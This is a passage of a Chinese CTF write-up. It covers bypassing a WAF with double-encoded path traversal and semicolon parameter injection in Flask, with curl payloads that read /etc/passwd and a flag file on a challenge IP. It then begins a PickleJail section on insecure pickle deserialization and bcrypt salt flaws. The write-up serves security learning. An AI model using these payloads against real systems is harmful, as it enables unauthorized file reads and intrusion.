+</span></span><span class="line"><span class="cl">%2F    →  Werkzeug 第2次解码   →  /    →  实际路径分隔符</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>WAF 的正则规则为 <code>(\.\.\/|%2e%2e%2f)[a-zA-Z]</code>，检测 <code>../</code> 或 <code>%2e%2e%2f</code> 后跟字母。</p>
+<p>使用<strong>字面点 + 编码斜杠</strong> (<code>..%252f</code>) 可同时绕过两种模式：</p>
+<ul>
+<li><code>\.\.\/</code> 不匹配 —— <code>..%2f</code> 中没有字面 <code>/</code>（<code>%2f</code> 是 <code>%</code>, <code>2</code>, <code>f</code> 三个字符）</li>
+<li><code>%2e%2e%2f</code> 不匹配 —— 点是字面的，不是编码的</li>
+</ul>
+<p>验证：读取 <code>/etc/passwd</code> 确认路径遍历可行：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s2">&#34;http://TARGET:PORT/article?id=..%252f..%252f..%252fetc%252fpasswd&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 返回 /etc/passwd 内容 —— 路径遍历确认可行</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="scope-check存储范围限制"><span>Scope Check：存储范围限制</span>
+  <a href="#scope-check%e5%ad%98%e5%82%a8%e8%8c%83%e5%9b%b4%e9%99%90%e5%88%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>后端对包含 <code>..</code> 的路径进行 <code>os.path.realpath()</code> 检查，只允许存储根目录内的路径通过（以及 <code>/etc/passwd</code> 等白名单路径）。Scope 外的路径返回 &ldquo;outside the permitted storage scope&rdquo;。</p>
+<p>关键发现：对于<strong>不存在的路径</strong>，<code>realpath()</code> 解析失败 → 返回 Scope 错误；对于<strong>存在的目录</strong>，返回 &ldquo;Directory&rdquo; 错误。利用这个差异，可以逐层探测目录结构。</p>
+<h2 class="heading-element" id="路径发现逐层关键词试探"><span>路径发现：逐层关键词试探</span>
+  <a href="#%e8%b7%af%e5%be%84%e5%8f%91%e7%8e%b0%e9%80%90%e5%b1%82%e5%85%b3%e9%94%ae%e8%af%8d%e8%af%95%e6%8e%a2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>有了 WAF 绕过能力，将线索关键词作为目录名，<strong>逐层试探</strong>路径。每一步用 Directory 响应确认目标存在，再深入下一层。</p>
+<h3 class="heading-element" id="第一层目录--试探-private"><span>第一层目录 —— 试探 <code>../private</code></span>
+  <a href="#%e7%ac%ac%e4%b8%80%e5%b1%82%e7%9b%ae%e5%bd%95--%e8%af%95%e6%8e%a2-private" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>用线索关键词逐一测试 <code>../KEYWORD</code>：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">../private    → Directory  ← 确认存在！
+</span></span><span class="line"><span class="cl">../snapshot   → Scope (不存在/不在范围内)
+</span></span><span class="line"><span class="cl">../archive    → Scope
+</span></span><span class="line"><span class="cl">../migration  → Scope
+</span></span><span class="line"><span class="cl">../.snapshot  → Scope
+</span></span><span class="line"><span class="cl">../.archive   → Scope
+</span></span><span class="line"><span class="cl">../...</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>../private</code> 返回 Directory，确认为有效目录。&ldquo;Private Protection&rdquo; 的 <code>private</code> 作为第一层目录成立。</p>
+<h3 class="heading-element" id="第二层目录--在-private-下试探隐藏目录"><span>第二层目录 —— 在 <code>../private/</code> 下试探隐藏目录</span>
+  <a href="#%e7%ac%ac%e4%ba%8c%e5%b1%82%e7%9b%ae%e5%bd%95--%e5%9c%a8-private-%e4%b8%8b%e8%af%95%e6%8e%a2%e9%9a%90%e8%97%8f%e7%9b%ae%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>进入 <code>../private/</code>，用剩余关键词测试子目录：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">../private/snapshot   → Not Found
+</span></span><span class="line"><span class="cl">../private/.snapshot  → Directory  ← 确认存在！
+</span></span><span class="line"><span class="cl">../private/archive    → Not Found
+</span></span><span class="line"><span class="cl">../private/.archive   → Not Found
+</span></span><span class="line"><span class="cl">../private/migration  → Not Found
+</span></span><span class="line"><span class="cl">../private/..</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>../private/.snapshot</code> 返回 Directory。&ldquo;hidden snapshot namespace&rdquo; 中的 snapshot 取 <code>.snapshot</code>（hidden = dot 前缀）作为第二层目录成立。</p>
+<h3 class="heading-element" id="读取目标文件"><span>读取目标文件</span>
+  <a href="#%e8%af%bb%e5%8f%96%e7%9b%ae%e6%a0%87%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>进入 <code>../private/.snapshot/</code>，测试文件名：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">../private/.snapshot/node_flag.txt  → FLAG!  ← 命中
+</span></span><span class="line"><span class="cl">../private/.snapshot/flag           → Not Found
+</span></span><span class="line"><span class="cl">../private/.snapshot/flag.txt       → Not Found
+</span></span><span class="line"><span class="cl">../private/.snapshot/secret         → Not Found</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>.snapshot/</code> <strong>目录下只有一个文件</strong> <code>node_flag.txt</code><strong>，直接命中。</strong></p>
+<h3 class="heading-element" id="额外发现分号参数注入"><span>额外发现：分号参数注入</span>
+  <a href="#%e9%a2%9d%e5%a4%96%e5%8f%91%e7%8e%b0%e5%88%86%e5%8f%b7%e5%8f%82%e6%95%b0%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在后续探索中还发现 Flask/Werkzeug 将 <code>;</code> 视为查询参数分隔符（等价于 <code>&amp;</code>），但 HyperGuard WAF 不识别分号语法。利用这一点可以构造 WAF 完全不可见的参数注入：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">GET /article?foo=bar;id=..%252Fprivate%252F.snapshot%252Fnode_flag.txt</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>WAF 只看到 <code>foo=bar</code>（不识别 <code>;</code> 后的内容），<code>id</code> 参数对 WAF 完全透明。</p>
+<h2 class="heading-element" id="漏洞利用"><span>漏洞利用</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="payload"><span>Payload</span>
+  <a href="#payload" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 方法1: 纯双重编码</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://36.213.142.135:21418/article?id=..%252fprivate%252f.snapshot%252fnode_flag.txt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 方法2: 分号参数注入 + 双重编码</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://36.213.142.135:21418/article?foo=bar;id=..%252Fprivate%252F.snapshot%252Fnode_flag.txt&#34;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="请求处理流程"><span>请求处理流程</span>
+  <a href="#%e8%af%b7%e6%b1%82%e5%a4%84%e7%90%86%e6%b5%81%e7%a8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">请求: ?id=..%252fprivate%252f.snapshot%252fnode_flag.txt
+</span></span><span class="line"><span class="cl">                    │
+</span></span><span class="line"><span class="cl">    ┌───────────────┴───────────────┐
+</span></span><span class="line"><span class="cl">    │  自定义 C++ HTTP 解析器        │
+</span></span><span class="line"><span class="cl">    │  第1次 URL 解码: %25 → %       │
+</span></span><span class="line"><span class="cl">    │  → id = ..%2fprivate%2f.snapshot%2fnode_flag.txt
+</span></span><span class="line"><span class="cl">    └───────────────┬───────────────┘
+</span></span><span class="line"><span class="cl">                    │
+</span></span><span class="line"><span class="cl">    ┌───────────────┴───────────────┐
+</span></span><span class="line"><span class="cl">    │  HyperGuard WAF                │
+</span></span><span class="line"><span class="cl">    │  检测: (\.\.\/|%2e%2e%2f)[a-zA-Z]
+</span></span><span class="line"><span class="cl">    │  ..%2f → 无字面 /，无编码点     │
+</span></span><span class="line"><span class="cl">    │  → 不匹配任何模式 → PASS        │
+</span></span><span class="line"><span class="cl">    └───────────────┬───────────────┘
+</span></span><span class="line"><span class="cl">                    │
+</span></span><span class="line"><span class="cl">    ┌───────────────┴───────────────┐
+</span></span><span class="line"><span class="cl">    │  Werkzeug / Flask              │
+</span></span><span class="line"><span class="cl">    │  第2次 URL 解码: %2f → /       │
+</span></span><span class="line"><span class="cl">    │  → id = ../private/.snapshot/node_flag.txt
+</span></span><span class="line"><span class="cl">    │  → realpath 解析，在存储范围内   │
+</span></span><span class="line"><span class="cl">    │  → 返回 flag 内容               │
+</span></span><span class="line"><span class="cl">    └───────────────────────────────┘</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>Flag</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{1jslas4jmd8agd1udk4j7jq5crs5ihr0}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h1 class="heading-element" id="picklejail"><span>PickleJail</span>
+  <a href="#picklejail" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>这道题基于本地信息库和以往经验，飞快完成了认证绕过和反序列化链缩减，但一直卡在最后一步，根本原因是 AI 流程设计错误，它基于我的提示词去测试，RCE 后方向依赖人逐条指令，而 cleanup 机制又让每个测试的编写成本很高，试错效率低。</p>
+<h2 class="heading-element" id="源码审计"><span>源码审计</span>
+  <a href="#%e6%ba%90%e7%a0%81%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="路径穿越获取源码"><span>路径穿越获取源码</span>
+  <a href="#%e8%b7%af%e5%be%84%e7%a9%bf%e8%b6%8a%e8%8e%b7%e5%8f%96%e6%ba%90%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>/pic</code> 端点存在路径穿越，通过 <code>../../app.py</code> 等可读取任意文件：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/pic&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pic</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pic</span><span class="o">:=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;pic&#39;</span><span class="p">))</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filepath</span><span class="o">:=</span><span class="sa">f</span><span class="s2">&#34;./files/uploads/</span><span class="si">{</span><span class="n">pic</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span><span class="o">==</span><span class="sa">b</span><span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">))</span>  <span class="c1"># ← 无限制 pickle 反序列化</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;...</span><span class="si">{</span><span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">5000</span><span class="p">]</span><span class="si">}</span><span class="s1">&#39;&#39;&#39;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="认证模块-userspy"><span>认证模块 (Users.py)</span>
+  <a href="#%e8%ae%a4%e8%af%81%e6%a8%a1%e5%9d%97-userspy" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>bcrypt 使用固定 salt，且 C 实现存在 null-byte 截断：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">usernames</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">usernames</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">usernames</span><span class="p">[</span><span class="n">username</span><span class="p">]]</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
